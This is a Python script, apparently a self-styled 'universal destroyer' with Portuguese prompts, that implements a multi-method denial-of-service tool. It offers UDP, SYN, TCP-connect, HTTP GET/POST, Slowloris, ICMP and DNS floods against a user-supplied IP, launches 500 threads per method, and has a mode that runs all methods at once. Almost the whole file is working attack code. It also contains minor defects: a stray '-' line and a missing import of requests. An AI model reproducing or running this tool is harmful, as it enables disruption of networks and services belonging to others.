#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ABIDELTA OMEGA v2 - UNIVERSAL DESTROYER
PC | Termux | Linux | Windows
python omega.py
"""
import os, socket, time, threading, random, signal, sys

# ---------- cores ----------
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
W = "\033[0m"
B = "\033[1m"

# ---------- config ----------
pkts = 0
stop = False
threads_padrao = 500
max_udp_size = 65507

def signal_handler(sig, frame):
    global stop
    stop = True
    print("\n" + Y + "[!] Parando OMEGA..." + W)
signal.signal(signal.SIGINT, signal_handler)

def banner():
    os.system("cls||clear")
    print(f"""
{R}╔═══════════════════════════════════════════════════════════════════════╗
║ {B}{G}  ██████╗ ███╗   ███╗ ██████╗ ██████╗ ███████╗███╗   ███╗ ██████╗ {W}  {R}║
║ {B}{G} ██╔═══██╗████╗ ████║██╔═══██╗██╔══██╗██╔════╝████╗ ████║██╔═══██╗{W}  {R}║
║ {B}{G} ██║   ██║██╔████╔██║██║   ██║██║  ██║█████╗  ██╔████╔██║██║   ██║{W}  {R}║
║ {B}{G} ██║   ██║██║╚██╔╝██║██║   ██║██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║{W}  {R}║
║ {B}{G}  ╚██████╔╝██║  ╚═╝ ██║╚██████╔╝██████╔╝███████╗██║  ╚═╝ ██║╚██████╔╝{W}  {R}║
║ {B}{G}   ╚═════╝  ╚═╝      ╚═╝  ╚═════╝  ╚═════╝  ╚══════╝╚═╝      ╚═╝  ╚═════╝ {W}  {R}║
║ {C}UNIVERSAL DESTROYER - PC | TERMUX | LINUX | WINDOWS - ABIDELTA{W}       {R}║
╚═══════════════════════════════════════════════════════════════════════╝
""")

-
try:
    from scapy.all import IP, TCP, UDP, ICMP, DNS, DNSQR, send, Raw
except ImportError:
    print(Y + "[*] Instalando scapy..." + W)
    os.system("pip install scapy -q")
    from scapy.all import IP, TCP, UDP, ICMP, DNS, DNSQR, send, Raw


def stats():
    global pkts
    while not stop:
        sys.stdout.write(f"\r{C}[LIVE] {B}Pkts/s: {G}{pkts}{W}      ")
        sys.stdout.flush()
        pkts = 0
        time.sleep(1)


def udp(ip, port, pps):
    global pkts
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = os.urandom(max_udp_size)
    while not stop:
        try:
            sock.sendto(data, (ip, port))
            pkts += 1
            time.sleep(1 / pps)
        except:
            pass

def tcp_syn(ip, port, pps):
    global pkts
    while not stop:
        try:
            send(IP(dst=ip) / TCP(dport=port, flags="S"), verbose=0)
            pkts += 1
            time.sleep(1 / pps)
        except:
            pass

def tcp_connect(ip, port, pps):
    global pkts
    while not stop:
        try:
            s = socket.socket()
            s.settimeout(1)
            s.connect((ip, port))
            s.close()
            pkts += 1
        except:
            pass
        time.sleep(1 / pps)

def http_get(ip, port, pps):
    global pkts
    url = f"http://{ip}:{port}"
    while not stop:
        try:
            requests.get(url, headers={"User-Agent": "ABIDELTA"}, timeout=3)
            pkts += 1
        except:
            pass
        time.sleep(1 / pps)

def http_post(ip, port, pps):
    global pkts
    url = f"http://{ip}:{port}"
    while not stop:
        try:
            requests.post(url, data={"k": "x" * 2000}, timeout=3)
            pkts += 1
        except:
            pass
        time.sleep(1 / pps)

def slowloris(ip, port, pps):
    global pkts
    socks = []
    while not stop:
        if len(socks) < 500:
            try:
                s = socket.socket()
                s.settimeout(2)
                s.connect((ip, port))
                s.send(f"GET /?{random.random()} HTTP/1.1\r\nHost: {ip}\r\n".encode())
                socks.append(s)
            except:
                pass
        for s in socks[:]:
            try:
                s.send(f"X-a: {random.random()}\r\n".encode())
                pkts += 1
            except:
                socks.remove(s)
        time.sleep(1 / pps)

def icmp(ip, pps):
    global pkts
    while not stop:
        try:
            send(IP(dst=ip) / ICMP(), verbose=0)
            pkts += 1
        except:
            pass
        time.sleep(1 / pps)

def dns_flood(ip, port, pps):
    global pkts
    while not stop:
        try:
            send(IP(dst=ip) / UDP(dport=port) / DNS(rd=1, qd=DNSQR(qname="abidelta.com")), verbose=0)
            pkts += 1
        except:
            pass
        time.sleep(1 / pps)


def main():
    banner()
    print(f"{Y}[1]{W} UDP Flood (65 kB)")
    print(f"{Y}[2]{W} TCP SYN Flood")
    print(f"{Y}[3]{W} TCP Connect Flood")
    print(f"{Y}[4]{W} HTTP GET Flood")
    print(f"{Y}[5]{W} HTTP POST Flood")
    print(f"{Y}[6]{W} Slowloris")
    print(f"{Y}[7]{W} ICMP Flood")
    print(f"{Y}[8]{W} DNS Flood (porta 53)")
    print(f"{Y}[9]{W} TODOS JUNTOS")
    modo = input("Modo: ").strip()
    ip = input("IP alvo: ").strip()
    port = int(input("Porta: ") or 80)
    pps = int(input("Pacotes/segundo: ") or 10000)
    banner()
    print(G + "[+] Iniciando ataque..." + W)
    threading.Thread(target=stats, daemon=True).start()

    funcs = {
        "1": (udp, (ip, port, pps)),
        "2": (tcp_syn, (ip, port, pps)),
        "3": (tcp_connect, (ip, port, pps)),
        "4": (http_get, (ip, port, pps)),
        "5": (http_post, (ip, port, pps)),
        "6": (slowloris, (ip, port, pps)),
        "7": (icmp, (ip, pps)),
        "8": (dns_flood, (ip, port, pps)),
    }

    if modo == "9":
        for k, (f, a) in funcs.items():
            for _ in range(threads_padrao):
                threading.Thread(target=f, args=a, daemon=True).start()
    else:
        f, a = funcs[modo]
        for _ in range(threads_padrao):
            threading.Thread(target=f, args=a, daemon=True).start()

    while not stop:
        time.sleep(1)
    print(R + "\n[✓] Ataque finalizado." + W)

if __name__ == "__main__":
    main()